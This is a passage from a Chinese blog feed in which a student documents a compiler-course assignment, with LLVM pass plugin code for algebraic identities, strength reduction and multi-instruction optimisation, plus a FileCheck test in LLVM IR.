class="string">&quot;C&quot;</span> <span class="function">PassPluginLibraryInfo <span class="title">llvmGetPassPluginInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">      .APIVersion = LLVM_PLUGIN_API_VERSION,</span><br><span class="line">      .PluginName = <span class="string">&quot;FunctionInfo&quot;</span>,</span><br><span class="line">      .PluginVersion = LLVM_VERSION_STRING,</span><br><span class="line">      .RegisterPassBuilderCallbacks =</span><br><span class="line">          [](PassBuilder &amp;PB) &#123;</span><br><span class="line">            PB.<span class="built_in">registerPipelineParsingCallback</span>(</span><br><span class="line">                [](StringRef Name, ModulePassManager &amp;MPM,</span><br><span class="line">                   ArrayRef&lt;PassBuilder::PipelineElement&gt;) -&gt; <span class="keyword">bool</span> &#123;</span><br><span class="line">                  <span class="keyword">if</span> (Name == <span class="string">&quot;function-info&quot;</span>) &#123;</span><br><span class="line">                    MPM.<span class="built_in">addPass</span>(<span class="built_in">FunctionInfoPass</span>());</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">          &#125; <span class="comment">// RegisterPassBuilderCallbacks</span></span><br><span class="line">  &#125;;        <span class="comment">// struct PassPluginLibraryInfo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250701115438028.png" alt="image-20250701115438028"></p><h2 id="LocalOpts"><a href="#LocalOpts" class="headerlink" title="LocalOpts"></a>LocalOpts</h2><h3 id="1-AlgebraicIdentity"><a href="#1-AlgebraicIdentity" class="headerlink" title="1-AlgebraicIdentity"></a>1-AlgebraicIdentity</h3><p>这个函数是用来处理一些诸如<strong>𝑥 + 0 = 0 + 𝑥, 𝑥 × 1 = 1 × 𝑥 ⇒ 𝑥</strong>的情况,值得注意的是，除法和减法注意处理两个操作数一致的情况</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LocalOpts.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">AlgebraicIdentityPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             FunctionAnalysisManager &amp;)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//这里作为练习只考虑Add，Sub，Mul，SDiv，不考虑无符号数</span></span><br><span class="line">  <span class="keyword">bool</span> Changed = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;BB : F)</span><br><span class="line">  &#123;</span><br><span class="line">    SmallVector&lt;Instruction *, <span class="number">16</span>&gt; DeadInsts; <span class="comment">// 收集待删除指令,如果小于16个就保存在栈，如果大于就存在堆里</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;I : <span class="built_in">make_early_inc_range</span>(BB))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(isa&lt;BinaryOperator&gt;(I))</span><br><span class="line">      &#123;</span><br><span class="line">        Value *Op1 = I.<span class="built_in">getOperand</span>(<span class="number">0</span>);<span class="comment">//获取操作数</span></span><br><span class="line">        Value *Op2 = I.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        ConstantInt *CI1 = dyn_cast&lt;ConstantInt&gt;(Op1);<span class="comment">//尝试转化为常量</span></span><br><span class="line">        ConstantInt *CI2 = dyn_cast&lt;ConstantInt&gt;(Op2);</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (I.<span class="built_in">getOpcode</span>()) </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Add:<span class="comment">//加法</span></span><br><span class="line">            <span class="keyword">if</span>(CI1 &amp;&amp; CI1-&gt;<span class="built_in">isZero</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op2);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">isZero</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op1);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Sub:<span class="comment">//减法</span></span><br><span class="line">            <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">isZero</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op1);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(Op1 == Op2)</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(ConstantInt::<span class="built_in">getSigned</span>(I.<span class="built_in">getType</span>(), <span class="number">0</span>));</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Mul:<span class="comment">//乘法</span></span><br><span class="line">            <span class="keyword">if</span>(CI1 &amp;&amp; CI1-&gt;<span class="built_in">isOne</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op2);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">isOne</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op1);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> Instruction::SDiv:<span class="comment">//除法</span></span><br><span class="line">            <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">isOne</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op1);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (Op1 == Op2)</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(ConstantInt::<span class="built_in">getSigned</span>(I.<span class="built_in">getType</span>(), <span class="number">1</span>));</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!DeadInsts.<span class="built_in">empty</span>()) </span><br><span class="line">    &#123;</span><br><span class="line">      Changed = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">for</span> (Instruction *DeadI : DeadInsts) </span><br><span class="line">      &#123;</span><br><span class="line">        DeadI-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Changed ? PreservedAnalyses::<span class="built_in">none</span>() : PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-StrengthReduction"><a href="#2-StrengthReduction" class="headerlink" title="2-StrengthReduction"></a>2-StrengthReduction</h3><p>这个函数是处理<strong>4 × 𝑥 = 𝑥 × 4 ⇒ or 𝑥 ≪ 2</strong>这种情况的，包括除法和乘法，注意除法要使用Ash防止被除数为负数</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LocalOpts.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">StrengthReductionPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             FunctionAnalysisManager &amp;)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> Changed = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;BB:F)</span><br><span class="line">  &#123;</span><br><span class="line">    SmallVector&lt;Instruction *, <span class="number">16</span>&gt; DeadInsts; <span class="comment">// 收集待删除指令,如果小于16个就保存在栈，如果大于就存在堆里</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;I:<span class="built_in">make_early_inc_range</span>(BB))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(isa&lt;BinaryOperator&gt;(I))</span><br><span class="line">      &#123;</span><br><span class="line">        Value *Op1 = I.<span class="built_in">getOperand</span>(<span class="number">0</span>);<span class="comment">//获取操作数</span></span><br><span class="line">        Value *Op2 = I.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        ConstantInt *CI1 = dyn_cast&lt;ConstantInt&gt;(Op1);<span class="comment">//尝试转化为常量</span></span><br><span class="line">        ConstantInt *CI2 = dyn_cast&lt;ConstantInt&gt;(Op2);</span><br><span class="line">        <span class="keyword">bool</span> StrengthFlag = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (I.<span class="built_in">getOpcode</span>()) </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Mul:<span class="comment">//乘法</span></span><br><span class="line">            <span class="keyword">if</span>( CI1 &amp;&amp; CI1-&gt;<span class="built_in">getSExtValue</span>() &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">isPowerOf2_64</span>(CI1-&gt;<span class="built_in">getZExtValue</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">              Value* ShiftVal = ConstantInt::<span class="built_in">get</span>(CI1-&gt;<span class="built_in">getType</span>(),<span class="built_in">countTrailingZeros</span>(CI1-&gt;<span class="built_in">getZExtValue</span>()));</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(</span><br><span class="line">                BinaryOperator::<span class="built_in">Create</span>(Instruction::Shl, Op2, ShiftVal, <span class="string">&quot;&quot;</span>, &amp;I)</span><br><span class="line">              );</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">getSExtValue</span>() &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">isPowerOf2_64</span>(CI2-&gt;<span class="built_in">getZExtValue</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">              Value* ShiftVal = ConstantInt::<span class="built_in">get</span>(CI2-&gt;<span class="built_in">getType</span>(),<span class="built_in">countTrailingZeros</span>(CI2-&gt;<span class="built_in">getZExtValue</span>()));</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(</span><br><span class="line">                BinaryOperator::<span class="built_in">Create</span>(Instruction::Shl, Op1, ShiftVal, <span class="string">&quot;&quot;</span>, &amp;I)</span><br><span class="line">              );</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> Instruction::SDiv:<span class="comment">//除法</span></span><br><span class="line">            <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">getSExtValue</span>() &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">isPowerOf2_64</span>(CI2-&gt;<span class="built_in">getZExtValue</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">              Value* ShiftVal = ConstantInt::<span class="built_in">get</span>(CI2-&gt;<span class="built_in">getType</span>(),<span class="built_in">countTrailingZeros</span>(CI2-&gt;<span class="built_in">getZExtValue</span>()));</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(</span><br><span class="line">                BinaryOperator::<span class="built_in">Create</span>(Instruction::AShr, Op1, ShiftVal, <span class="string">&quot;&quot;</span>, &amp;I)</span><br><span class="line">              );</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!DeadInsts.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">      Changed = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">for</span>(Instruction *DeadI : DeadInsts)&#123;</span><br><span class="line">        DeadI-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Changed ? PreservedAnalyses::<span class="built_in">none</span>() : PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-MultiInstOpt"><a href="#3-MultiInstOpt" class="headerlink" title="3-MultiInstOpt"></a>3-MultiInstOpt</h3><p>这个函数是多指令优化，主要是处理<strong>𝑎 = 𝑏 + 1, 𝑐 = 𝑎 − 1 ⇒ 𝑎 = 𝑏 + 1, 𝑐 = 𝑏</strong>这种情况的,这里我一开始还准备优化除法和乘法，但是最后写完了才发现有可能出现溢出的情况，所以不适用，就只做了加法和减法的</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LocalOpts.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">MultiInstOptPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        FunctionAnalysisManager &amp;)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">bool</span> Changed = <span class="literal">false</span>;</span><br><span class="line">  SmallVector&lt;Instruction *, <span class="number">32</span>&gt; DeadInsts;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;BB : <span class="built_in">make_early_inc_range</span>(F))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;I:<span class="built_in">make_early_inc_range</span>(BB))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(isa&lt;BinaryOperator&gt;(I))</span><br><span class="line">      &#123;</span><br><span class="line">        Value *Op1 = I.<span class="built_in">getOperand</span>(<span class="number">0</span>);<span class="comment">//获取操作数</span></span><br><span class="line">        Value *Op2 = I.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        ConstantInt *CI1 = dyn_cast&lt;ConstantInt&gt;(Op1);<span class="comment">//尝试转化为常量</span></span><br><span class="line">        ConstantInt *CI2 = dyn_cast&lt;ConstantInt&gt;(Op2);</span><br><span class="line">        Value *Var = <span class="literal">nullptr</span>;</span><br><span class="line">        ConstantInt *Con = <span class="literal">nullptr</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(CI1 &amp;&amp; !CI2)</span><br><span class="line">        &#123;</span><br><span class="line">          Con = CI1;</span><br><span class="line">          Var = Op2;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!CI1 &amp;&amp; CI2)</span><br><span class="line">        &#123;</span><br><span class="line">          Con = CI2;</span><br><span class="line">          Var = Op1;</span><br><span class="line">        &#125;<span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (I.<span class="built_in">getOpcode</span>()) </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Add:</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> *U : I.<span class="built_in">users</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span>(<span class="keyword">auto</span> *II = dyn_cast&lt;BinaryOperator&gt;(U))</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span>(II-&gt;<span class="built_in">getOpcode</span>()==Instruction::Sub &amp;&amp; II-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>) == &amp;I)</span><br><span class="line">                &#123;</span><br><span class="line">                  ConstantInt *CCI2 = dyn_cast&lt;ConstantInt&gt;(II-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>));</span><br><span class="line">                  <span class="keyword">if</span>(CCI2 &amp;&amp; (CCI2-&gt;<span class="built_in">getValue</span>() == Con-&gt;<span class="built_in">getValue</span>()))</span><br><span class="line">                  &#123;</span><br><span class="line">                    II-&gt;<span class="built_in">replaceAllUsesWith</span>(Var);</span><br><span class="line">                    DeadInsts.<span class="built_in">push_back</span>(II);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;       </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          <span class="keyword">case</span> Instruction :: Sub:</span><br><span class="line">          &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(!CI1 &amp;&amp; CI2)</span><br><span class="line">            &#123;</span><br><span class="line">              </span><br><span class="line">              SmallVector&lt;Instruction *, <span class="number">16</span>&gt; DeadInsts;</span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">auto</span> *U : I.<span class="built_in">users</span>())</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">auto</span> *II = dyn_cast&lt;BinaryOperator&gt;(U))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span>(II-&gt;<span class="built_in">getOpcode</span>()==Instruction::Add)</span><br><span class="line">                  &#123;</span><br><span class="line">                    ConstantInt *CCI1 = dyn_cast&lt;ConstantInt&gt;(II-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>));</span><br><span class="line">                    ConstantInt *CCI2 = dyn_cast&lt;ConstantInt&gt;(II-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">if</span>(II-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>) == &amp;I)</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span>(CCI1 &amp;&amp; CCI1-&gt;<span class="built_in">getValue</span>() == Con-&gt;<span class="built_in">getValue</span>())</span><br><span class="line">                      &#123;</span><br><span class="line">                        II-&gt;<span class="built_in">replaceAllUsesWith</span>(Var);</span><br><span class="line">                        DeadInsts.<span class="built_in">push_back</span>(II);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (II-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>) == &amp;I) </span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span>(CCI2 &amp;&amp; CCI2-&gt;<span class="built_in">getValue</span>() == Con-&gt;<span class="built_in">getValue</span>())</span><br><span class="line">                      &#123;</span><br><span class="line">                        II-&gt;<span class="built_in">replaceAllUsesWith</span>(Var);</span><br><span class="line">                        DeadInsts.<span class="built_in">push_back</span>(II);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//乘法除法存在溢出问题，不能优化</span></span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!DeadInsts.<span class="built_in">empty</span>()) </span><br><span class="line">  &#123;</span><br><span class="line">    Changed = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (Instruction *DeadI : DeadInsts) </span><br><span class="line">    &#123;</span><br><span class="line">      DeadI-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Changed ? PreservedAnalyses::<span class="built_in">none</span>() : PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="FileCheck"><a href="#FileCheck" class="headerlink" title="FileCheck"></a>FileCheck</h3><p>我偷懒只做了TastCase1.ll的filecheck，无法检查第三个pass，我附上TastCaseBasic的效果图</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">; 第一阶段：只运行 AlgebraicIdentityPass</span><br><span class="line">; RUN: opt -load-pass-plugin=%dylibdir/libLocalOpts.so \</span><br><span class="line">; RUN:     -p=algebraic-identity \</span><br><span class="line">; RUN:     -S %s -o %basename_t.algebraic</span><br><span class="line">; RUN: FileCheck --check-prefix=CHECK-ALGEBRAIC %s --input-file=%basename_t.algebraic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; 第二阶段：运行 AlgebraicIdentityPass + StrengthReductionPass</span><br><span class="line">; RUN: opt -load-pass-plugin=%dylibdir/libLocalOpts.so \</span><br><span class="line">; RUN:     -p=algebraic-identity,strength-reduction \</span><br><span class="line">; RUN:     -S %s -o %basename_t.strength</span><br><span class="line">; RUN: FileCheck --check-prefix=CHECK-STRENGTH %s --input-file=%basename_t.strength</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; 第三阶段：运行所有 Pass</span><br><span class="line">; RUN: opt -load-pass-plugin=%dylibdir/libLocalOpts.so \</span><br><span class="line">; RUN:     -p=algebraic-identity,strength-reduction,multi-inst-opt \</span><br><span class="line">; RUN:     -S %s -o %basename_t.all</span><br><span class="line">; RUN: FileCheck --check-prefix=CHECK-ALL %s --input-file=%basename_t.all</span><br><span class="line"></span><br><span class="line">; <span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">; void foo(int a) &#123;</span><br><span class="line">;   int r0 = a + 0;</span><br><span class="line">;   int r1 = r0 * 16;</span><br><span class="line">;   int r2 = r1 * r0;</span><br><span class="line">;   int r3 = r2 / a;</span><br><span class="line">;   int r4 = r2 / 10;</span><br><span class="line">;   int r5 = 54 * r3;</span><br><span class="line">;   int r6 = r4 / 128;</span><br><span class="line">;   int r7 = r5 / 54;</span><br><span class="line">;   int r8 = r4 / 1;</span><br><span class="line">;   int r9 = r7 - 0;</span><br><span class="line">;   <span class="built_in">printf</span>(<span class="string">&quot;%d,%d,%d,%d,%d,%d,%d,%d,%d,%d\n&quot;</span>, r0, r1, r2, r3, r4, r5, r6, r7, r8,</span><br><span class="line">;          r9);</span><br><span class="line">; &#125;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [31 x i8] c<span class="string">&quot;%d,%d,%d,%d,%d,%d,%d,%d,%d,%d\0A\00&quot;</span>, align 1</span><br><span class="line"></span><br><span class="line">; 检查第一个pass</span><br><span class="line">; CHECK-ALGEBRAIC-LABEL: define dso_local void @foo(i32 noundef %0) &#123;</span><br><span class="line">; 检查加法优化：%2 = add nsw i32 %0, 0 → 被删除</span><br><span class="line">; CHECK-ALGEBRAIC-NOT:   add nsw i32 %0, 0</span><br><span class="line"></span><br><span class="line">; 检查乘法指令（使用%0替代%2）：</span><br><span class="line">; CHECK-ALGEBRAIC:       [[MUL1:%.*]] = mul nsw i32 %0, 16</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[MUL2:%.*]] = mul nsw i32 [[MUL1]], %0</span><br><span class="line"></span><br><span class="line">; 检查除法指令：</span><br><span class="line">; CHECK-ALGEBRAIC:       [[DIV1:%.*]] = sdiv i32 [[MUL2]], %0</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[DIV2:%.*]] = sdiv i32 [[MUL2]], 10</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[MUL3:%.*]] = mul nsw i32 54, [[DIV1]]</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[DIV3:%.*]] = sdiv i32 [[DIV2]], 128</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  [[DIV4:%.*]] = sdiv i32 [[MUL3]], 54</span><br><span class="line"></span><br><span class="line">; 检查除法优化：%10 = sdiv i32 %6, 1 → 被删除</span><br><span class="line">; CHECK-ALGEBRAIC-NOT:   &#123;&#123;.*&#125;&#125; = sdiv i32 &#123;&#123;.*&#125;&#125;, 1</span><br><span class="line"></span><br><span class="line">; 检查减法优化：%11 = sub nsw i32 %9, 0 → 被删除</span><br><span class="line">; CHECK-ALGEBRAIC-NOT:   &#123;&#123;.*&#125;&#125; = sub nsw i32 &#123;&#123;.*&#125;&#125;, 0</span><br><span class="line"></span><br><span class="line">; 验证<span class="built_in">printf</span>调用参数（使用捕获的变量名）：</span><br><span class="line">; CHECK-ALGEBRAIC:       [[CALL1:%.*]] = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str, i32 noundef %0, i32 noundef [[MUL1]], i32 noundef [[MUL2]], i32 noundef [[DIV1]], i32 noundef [[DIV2]], i32 noundef [[MUL3]], i32 noundef [[DIV3]],  i32 noundef [[DIV4]], i32 noundef [[DIV2]], i32 noundef [[DIV4]])</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:       ret void</span><br><span class="line">; CHECK-ALGEBRAIC-NEXT:  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; 检查第二个pass</span><br><span class="line">; CHECK-STRENGTH-LABEL: define dso_local void @foo(i32 noundef %0) &#123;</span><br><span class="line">; CHECK-STRENGTH:       [[SHL1:%.*]] = shl i32 %0, 4</span><br><span class="line">; CHECK-STRENGTH-NOT:   &#123;&#123;.*&#125;&#125; = mul nsw i32 &#123;&#123;.*&#125;&#125;, 16</span><br><span class="line"></span><br><span class="line">; CHECK-STRENGTH:       [[SHIFT2:%.*]] = ashr i32 &#123;&#123;%.*&#125;&#125;, 7</span><br><span class="line">; CHECK-STRENGTH-NOT:   sdiv i32 &#123;&#123;.*&#125;&#125;, 128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; 检查第三个pass</span><br><span class="line">; CHECK-ALL-LABEL:      define dso_local void @foo(i32 noundef %0) &#123;</span><br><span class="line">define dso_local void @foo(i32 noundef %0) &#123;</span><br><span class="line">  %2 = add nsw i32 %0, 0</span><br><span class="line">  %3 = mul nsw i32 %2, 16</span><br><span class="line">  %4 = mul nsw i32 %3, %2</span><br><span class="line">  %5 = sdiv i32 %4, %0</span><br><span class="line">  %6 = sdiv i32 %4, 10</span><br><span class="line">  %7 = mul nsw i32 54, %5</span><br><span class="line">  %8 = sdiv i32 %6, 128</span><br><span class="line">  %9 = sdiv i32 %7, 54</span><br><span class="line">  %10 = sdiv i32 %6, 1</span><br><span class="line">  %11 = sub nsw i32 %9, 0</span><br><span class="line">  %12 = call i32 (ptr, ...) @<span class="built_in">printf</span>(ptr noundef @.str, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6, i32 noundef %7, i32 noundef %8, i32 noundef %9, i32 noundef %10, i32 noundef %11)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> i32 @<span class="built_in">printf</span>(ptr noundef, ...) <span class="comment">#1</span></span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250701120117722.png" alt="pass前"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250701120035599.png" alt="pass后"></p><p>可以看到确实优化掉了<code>sub nsw i32 %3, 3</code>这行</p>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> 编译原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSCD70 2023s Assignment 0 Introduction to Docker 记录</title>
      <link href="/2025/06/17/CSCD70%202023s%20Assignment%200%20Introduction%20to%20Docker%20%E8%AE%B0%E5%BD%95/"/>
